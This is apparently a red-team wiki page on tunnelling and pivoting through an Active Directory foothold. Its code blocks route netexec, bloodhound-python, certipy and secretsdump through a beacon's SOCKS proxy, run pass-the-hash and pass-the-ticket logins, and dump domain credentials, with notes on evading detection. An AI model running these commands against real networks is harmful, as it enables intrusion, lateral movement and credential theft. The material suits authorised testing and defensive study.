---
title: "C2 & Pivoting in AD (operating from the foothold)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [red-team, active-directory, c2, pivoting, tunneling, opsec]
---

# C2 & Pivoting in AD

Most AD tradecraft in this wiki runs from a **Linux operator host through a
tunnel** into the target network, not on the target itself — which is both an
evasion win ([[defense-evasion-ad]]) and how you use Impacket/Certipy/
bloodhound-python against a Windows domain. This page covers getting that
tunnel and running domain tooling through it, as part of the
[[redteam-ad-methodology]] flow.

## The tunnel

A foothold (implant/beacon on an internal host) exposes a **SOCKS proxy**;
everything else rides through it.

```bash
# proxychains routes Linux AD tooling through the beacon's SOCKS proxy
# /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains nxc smb 10.0.0.0/24
proxychains bloodhound-python -u user -p 'Pass' -d corp.local -ns 10.0.0.10 -c DCOnly
proxychains certipy find -u user@corp.local -p 'Pass' -dc-ip 10.0.0.10
```

For single services, a **port-forward** to the DC's ports is enough: 389/636
(LDAP/LDAPS, [[ldap]]), 445 (SMB, [[smb]]), 88 (Kerberos), 135+DRSUAPI for
[[dcsync]].

## Using stolen material through the tunnel

Credential reuse works the same over the proxy — no cracking needed:

```bash
# Pass-the-Hash / Pass-the-Key / Pass-the-Ticket through the tunnel
proxychains nxc smb dc01 -u admin -H <nthash>                 # PtH
proxychains secretsdump.py -hashes :<nthash> corp.local/admin@dc01
KRB5CCNAME=admin.ccache proxychains nxc smb dc01 --use-kcache # PtT (see below)
```

See [[pass-the-hash-and-ticket]], [[pass-the-key]], [[overpass-the-hash]] for
what each reuse primitive needs, and [[remote-execution]] for turning it into
a shell.

## Kerberos over the tunnel

Kerberos is timing- and name-sensitive, which bites through a proxy:

- Set `KRB5CCNAME` to your ccache and target hosts **by hostname** (Kerberos
  binds to SPNs, not IPs) — populate `/etc/hosts` for the DC/targets.
- Watch clock skew (`KRB_AP_ERR_SKEW`) — sync your host to the DC's time.
- ccache handling and format conversion are covered in
  [[ticket-and-credential-opsec]] and [[ccache]].

## OPSEC

Tunnelling keeps tooling off the target ([[defense-evasion-ad]]), but the
**protocol footprint still lands on the DC** — the DCSync/roast/LDAP tells in
[[opsec-ad-tradecraft]] apply regardless of where the tool ran. The tunnel
hides the *tool*, not the *traffic*.

## See also

- [[redteam-ad-methodology]] — where pivoting sits in the flow
- [[defense-evasion-ad]] — why operating remotely is an evasion
- [[ticket-and-credential-opsec]] — Kerberos over the wire
- [[pass-the-hash-and-ticket]] — the reuse primitives you tunnel
- [[remote-execution]] — execution once you're through
